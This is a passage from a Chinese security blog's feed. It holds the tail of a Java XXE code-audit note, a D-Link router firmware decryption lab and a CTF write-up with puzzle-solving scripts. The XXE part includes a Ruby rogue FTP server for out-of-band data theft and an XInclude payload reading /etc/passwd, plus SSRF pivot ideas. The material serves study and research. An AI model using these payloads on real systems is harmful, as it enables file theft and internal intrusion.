Java1.8.0_121@</span><br><span class="line">&lt; TYPE I</span><br><span class="line">&lt; EPSV ALL</span><br><span class="line">&lt; EPSV</span><br><span class="line">&lt; EPRT |1|172.17.29.150|60731|</span><br><span class="line">&lt; RETR test</span><br><span class="line">&lt; xxe</span><br><span class="line">&lt; ftp</span><br></pre></td></tr></table></figure><p>FTP Server代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &#39;socket&#39;</span><br><span class="line">server &#x3D; TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data &#x3D; &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req &#x3D; client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>测试的结果(Centos)：</p><table><thead><tr><th>Java版本</th><th>是否能读换行</th><th>被截断的字符</th><th>其他报错的字符(什么都不能读)</th><th>被替换成换行的字符</th></tr></thead><tbody><tr><td>1.7.0_80</td><td>是</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr><tr><td>1.8.0_121</td><td>是</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr><tr><td>1.8.0_181</td><td>否</td><td># ?</td><td>% &amp; ‘</td><td>/</td></tr></tbody></table><p>可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -)</p><p>也可以把FTP换成HTTP协议，更加直观</p><h3 id="3-支持的Xinclude的XXE"><a href="#3-支持的Xinclude的XXE" class="headerlink" title="3.支持的Xinclude的XXE"></a>3.支持的Xinclude的XXE</h3><p>POC</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>详情可以查看<a href="https://www.anquanke.com/post/id/156227">浅析xml之xinclude &amp; xslt</a></p><h3 id="各平台支持协议如下："><a href="#各平台支持协议如下：" class="headerlink" title="各平台支持协议如下："></a>各平台支持协议如下：</h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027165310121.png" alt="image-20211027165310121"></p><ol><li><a href="https://blog.spoock.com/2018/10/23/java-xxe/">JAVA常见的XXE漏洞写法和防御</a></li><li><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/">Java-XXE-总结</a></li><li><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java_XXE_漏洞</a></li></ol><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/">https://github-wiki-see.page/m/JoyChou93/java-sec-code/wiki/</a></p><p><a href="https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5">https://shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#CRLF%E6%B3%A8%E5%85%A5</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程&lt;/p&gt;
&lt;h1 id=&quot;0x01环境配置&quot;&gt;&lt;a href=&quot;#0x01环境配置&quot; class=&quot;headerlink&quot; title=&quot;0x01环境配置&quot;&gt;&lt;/a&gt;0x01环境配置&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Mac os 11.2.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tomcat 8.5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;idea&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;msyql 8.0.70&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;导入idea项目配置本地tomcat&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;JoyChou93&amp;#x2F;java-sec-code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd java-sec-code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mvn clean package&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Code_audit" scheme="http://www.ol4three.com/tags/Code-audit/"/>
    
      <category term="WEB安全" scheme="http://www.ol4three.com/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>D-Link DIR-882固件解密实验</title>
    <link href="http://www.ol4three.com/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/"/>
    <id>http://www.ol4three.com/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/</id>
    <published>2021-03-10T06:54:09.000Z</published>
    <updated>2022-07-22T10:00:30.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-实验目的"><a href="#0x01-实验目的" class="headerlink" title="0x01 实验目的"></a>0x01 实验目的</h1><blockquote><p>通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行</p></blockquote><h1 id="0x02-概述"><a href="#0x02-概述" class="headerlink" title="0x02 概述"></a>0x02 概述</h1><p>固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310145532897.png" alt="image-20210310145532897"></p><p>是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。</p><a id="more"></a><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><p>服务器：attify os</p><p>辅助工具：firmwalk.sh(以及3个固件都在附件里)</p><p><a href="https://github.com/OL4THREE/Practice-Note/tree/main/D-Link%20DIR-882固件解密实验">固件下载地址</a></p><h1 id="0x04-实验操作"><a href="#0x04-实验操作" class="headerlink" title="0x04 实验操作"></a>0x04 实验操作</h1><p>在本次实验中，我们首先将研究路由器固件升级常见的一种方案，并找到该方案 的漏洞所在，通过实际分析相关的几个固件，最后对新版加密固件的文件系统的 提取。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：iot 密码：attify</span><br><span class="line">数据库：postgre 密码：firmadyne</span><br></pre></td></tr></table></figure><p>这次的实验，我们以 D-Link DIR-882 固件为例。我们在分析固件时会发现它被 加密过了，使用 binwalk 根本无法探测，比如这次的固件 <code>v1.20b06</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151511835.png" alt="image-20210310151511835"></p><p>这时候我们可以考虑通过分析旧版本的固件尝试是否有什么线索来解密现在这 个新版本的固件 在 这 里 我 们 可 以 找 到 所 有 旧 版 本 的 固 件 （ <a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</a> ） ， 我 们 找 个 最 早 的 版 本 v1.00b07，下载来后解压尝试binwalk读取</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151552125.png" alt="image-20210310151552125"></p><p>可以看到能识别出信息，或者说是没有加密过的。 那再看看稍微新一点的版本</p><p><code>v1.10b02</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151718892.png" alt="image-20210310151718892"></p><p>可以看到有两个 bin 文件，说明 1.04b02 的过渡版本，它包含在 v1.10b02 固件包 汇中，名字也已经告诉我们了，1.04b02 是未加密的 分别使用 binwalk</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152045023.png" alt="image-20210310152045023"></p><p>而加密后的固件却什么也看不到</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152141476.png" alt="image-20210310152141476"></p><p>我们把 1.04b02 提取出来</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152258117.png" alt="image-20210310152258117"></p><p>进入生成的文件夹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152409226.png" alt="image-20210310152409226"></p><p>注意到有两个文件，使用 binwalk 提取 A0 进入新文件夹 再次提取8AB758最近进入文件夹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152655387.png" alt="image-20210310152655387"></p><p>注意到这里有一个 Imgdecrypt 的文件，看名字，应该是用来解密镜像的 file 查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153011754"></p><p>发现是个可执行文件，尝试执行，缺少相应的 so 文件，这很正常，因为这个文 件是写在 mips 架构上运行的，而我们目前是 x86 为了运行它，我们使用 qemy-mipsel-static</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153011754.png" alt="image-20210310153011754"></p><p>首先将其复制到固件根文件系统的/usr/bin 目录下 在将前面发现是加密的固件 1.20b06 复制过来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153928160"></p><p>接着还是同样的办法模拟 mips 架构拿到 shell 此时再执行 imgdecrypt 可以看到 打印出了使用方法 按照其提示，可以看到对原来加密的固件进行了解密 操作如上图所示 这时候再次使用 binwalk 查看被解密后的固件，可以看到已经可以识别了</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154124223.png" alt="image-20210310154124223"></p><p>这给我们的启示就是，在碰到加密的固件时，可以考率查找位于同一产品线、具 有相同处理器体系结构的路由器固件，找那些版本旧一些的，或者过渡版本，或 许就能为我们提供线索。 我们使用 binwalk 如之前未加密的固件一般一步步提取</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154715261.png" alt="image-20210310154715261"></p><h1 id="0x05-敏感信息分析"><a href="#0x05-敏感信息分析" class="headerlink" title="0x05 敏感信息分析"></a>0x05 敏感信息分析</h1><p>可以看到文件系统都被提取出来了 这里介绍一个常用的小工具 firmwalk.sh 它将搜索固件文件系统，以获取与敏感信息相关的东西，如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">etc&#x2F;shadow and etc&#x2F;passwd</span><br><span class="line">列出 etc&#x2F;ssl 目录</span><br><span class="line">搜索相关的文件，如. pem,. crt, 等。</span><br><span class="line">搜索配置文件</span><br><span class="line">查找脚本文件</span><br><span class="line">搜索其他. bin 文件</span><br><span class="line">查找诸如管理员。密码。远程等关键字。</span><br><span class="line">搜索在 IoT 设备上使用的通用网络服务器</span><br><span class="line">搜索常见的二进制文件，如 ssh。tftp。dropbear 等。</span><br><span class="line">搜索网址，电子邮件地址和 IP 地址</span><br></pre></td></tr></table></figure><p>我们可以使用它来看看这个文件系统中有哪些敏感信息 命令为./firmwalker.sh 文件系统的路径</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155058406.png" alt="image-20210310155058406"></p><p>password关键字文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155209933.png" alt="image-20210310155209933" style="zoom:50%;"><p>ssl相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155231701.png" alt="image-20210310155231701" style="zoom:50%;"><p>私钥相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155302852.png" alt="image-20210310155302852" style="zoom:50%;"><p>telnel相关文件</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155344902.png" alt="image-20210310155344902" style="zoom:50%;">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-实验目的&quot;&gt;&lt;a href=&quot;#0x01-实验目的&quot; class=&quot;headerlink&quot; title=&quot;0x01 实验目的&quot;&gt;&lt;/a&gt;0x01 实验目的&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x02-概述&quot;&gt;&lt;a href=&quot;#0x02-概述&quot; class=&quot;headerlink&quot; title=&quot;0x02 概述&quot;&gt;&lt;/a&gt;0x02 概述&lt;/h1&gt;&lt;p&gt;固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310145532897.png&quot; alt=&quot;image-20210310145532897&quot;&gt;&lt;/p&gt;
&lt;p&gt;是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="固件" scheme="http://www.ol4three.com/tags/%E5%9B%BA%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>2020-HWS-冬令营线上赛WP</title>
    <link href="http://www.ol4three.com/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/"/>
    <id>http://www.ol4three.com/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/</id>
    <published>2021-02-13T03:09:12.000Z</published>
    <updated>2021-03-04T11:30:04.440Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。</p></blockquote><ul><li>HWS冬令营介绍：<a href="https://mp.weixin.qq.com/s/9FNjVBNZAElZGrPxtsX19A">HWS计划2021硬件安全冬令营重磅回归！</a></li><li>入营赛题目附件：<a href="https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip">HWS20210128.zip</a></li></ul><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h2><blockquote><p>x86windows</p><p>考点：</p><p>加法的位运算实现</p><p>单子节爆破</p></blockquote><p>主要加密逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 31; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v2 &#x3D; i ^ a2[i];</span><br><span class="line">  v3 &#x3D; i &amp; a2[i];</span><br><span class="line">  v7 &#x3D; a2[i];</span><br><span class="line">  v6 &#x3D; i;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; 2 * (v6 &amp; v7);</span><br><span class="line">    v7 ^&#x3D; v6;</span><br><span class="line">    v6 &#x3D; v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 );</span><br><span class="line">  result &#x3D; &amp;a1[i];</span><br><span class="line">  a1[i] &#x3D; v7 ^ 0x23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>加密算法无法一眼看出对应的运算，直接写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">        v6 = i</span><br><span class="line">        v7 = j</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            v4 = <span class="number">2</span> * (v6 &amp; v7)</span><br><span class="line">            v7 = v7 ^ v6</span><br><span class="line">            v6 = v4</span><br><span class="line">            <span class="keyword">if</span> v4 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> v7 ^ <span class="number">0x23</span> == buf[i]:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % flag)</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果了解过加法的位运算实现的话，可以发现encrypt函数实际上是把对应input[i]加上i在异或，我们可以写出对应的逆运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">char decrypt(char c1,int i)&#123;</span><br><span class="line">    return (c1 ^ 0x23) - i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[40] &#x3D; &quot;\x12\x45\x10\x47\x19\x49\x49\x49\x1A\x4F\x1C\x1E\x52\x66\x1D\x52\x66\x67\x68\x67\x65\x6F\x5F\x59\x58\x5E\x6D\x70\xA1\x6E\x70\xA3&quot;;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; 32; i++)&#123;</span><br><span class="line">        putchar(decrypt(buf[i],i));</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ofbu"><a href="#ofbu" class="headerlink" title="ofbu"></a>ofbu</h2><h1 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h1><p>第一次做内核，基础学习文章如下：</p><ul><li><a href="https://lantern.cool/note-pwn-kernel-basics/">Linux Kernel Basics</a></li><li><a href="https://beafb1b1.github.io/kernel/linux_kernel_base/">linux内核基础</a></li><li><a href="https://lantern.cool/note-pwn-kernel-environment/">Linux Kernel 环境配置及调试</a></li><li><a href="https://bbs.pediy.com/thread-261586.htm">Linux Kernel Pwn 学习笔记(栈溢出)</a></li><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/08/24/gdb/">HWS夏令营 之 GDB调一切: 调试linux内核</a></li></ul><p>基础练习题目如下：</p><ul><li>练习文章：<a href="https://xz.aliyun.com/t/7625">Linux Kernel Pwn 初探</a></li><li>配套题目：链接:<a href="https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA">https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA</a> 密码:q58k</li></ul><p>进阶练习题目如下：ISCN2017 - babydriver、2018 强网杯 - core、2018 0CTF Finals Baby Kernel</p><ul><li><a href="https://lantern.cool/note-pwn-kernel-UAF/">Linux Kernel UAF <strong>CISCN2017 - babydriver</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-smep/">Linux Kernel bypass-smep <strong>CISCN2017 - babydriver</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-rop/">Linux Kernel ROP <strong>2018 强网杯 - core</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-ret2usr/">Linux Kernel ret2usr <strong>2018 强网杯 - core</strong></a></li><li><a href="https://lantern.cool/note-pwn-kernel-double-fetch/">Linux Kernel Double Fetch <strong>2018 0CTF Finals Baby Kernel</strong></a></li></ul><h2 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h2><p>逻辑总共为4个步骤</p><ol><li>输入flag</li><li>加载驱动，调用驱动中的函数加密flag</li><li>长调用，加密密文</li><li>Check，对比结果</li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114311164.png" alt="image-20210304114311164"></p><h3 id="驱动调用"><a href="#驱动调用" class="headerlink" title="驱动调用"></a>驱动调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114327405.png" alt="image-20210304114327405"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304113617543.png" alt="image-20210304113617543"></p><h3 id="查看驱动"><a href="#查看驱动" class="headerlink" title="查看驱动"></a>查看驱动</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114358052.png" alt="image-20210304114358052"></p><p><strong>最终调用的加密函数是驱动的sub_401340</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114503572.png" alt="image-20210304114503572"></p><p>参数分别是ring3传进来的  sub_401005(-1, &amp;v7, aAglfTTon5iSiht, 32, v4, &amp;Buf1);</p><p>V7是输入的flag，Buf1是加密的结果，aAglfTTon5iSiht是字符串常量<code>&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf</code>，32是长度</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304114649560.png" alt="image-20210304114649560"></p><p>依据相关的加密算法的特征，可判别sub_401710是des spankey函数，sub_401620是des encrypt函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121153289.png" alt="image-20210304121153289"></p><h3 id="长调用"><a href="#长调用" class="headerlink" title="长调用"></a>长调用</h3><p>利用call fwrod 返回用 retf</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121619358.png" alt="image-20210304121619358"></p><p>调用的是ring3下图的函数，功能很简单，就是一个简单的xor</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210304121657064.png" alt="image-20210304121657064"></p><p>解密脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf&#39;[:8]</span><br><span class="line">c&#x3D;[0xB2, 0xC4, 0x86, 0xD5, 0x54, 0x6C, 0x38, 0xAD, 0xBD, 0x69, 0xD4, 0xE9, 0x44, 0x47, 0x36, 0x21, 0x99, 0x91, 0xFB, 0x13, 0x70, 0xD8, 0x6B, 0xE4, 0x80, 0x12, 0xE2, 0x43, 0x2A, 0x4B, 0x49, 0x8E]</span><br><span class="line">for i in range(0x1e,-1,-1):</span><br><span class="line">    c[i]^&#x3D;c[i+1]</span><br><span class="line">cipher&#x3D;&#39;&#39;.join(list(map(chr,c)))</span><br><span class="line">des&#x3D;DES.new(key)</span><br><span class="line">flag&#x3D;des.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#">https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;HWS冬令营介绍：&lt;a href=&quot;https://mp.weixin.qq.com/s/9FNjVBNZAElZGrPxtsX19A&quot;&gt;HWS计划2021硬件安全冬令营重磅回归！&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;入营赛题目附件：&lt;a href=&quot;https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip&quot;&gt;HWS20210128.zip&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.ol4three.com/categories/CTF/"/>
    
    
      <category term="HWS" scheme="http://www.ol4three.com/tags/HWS/"/>
    
  </entry>
  
  <entry>
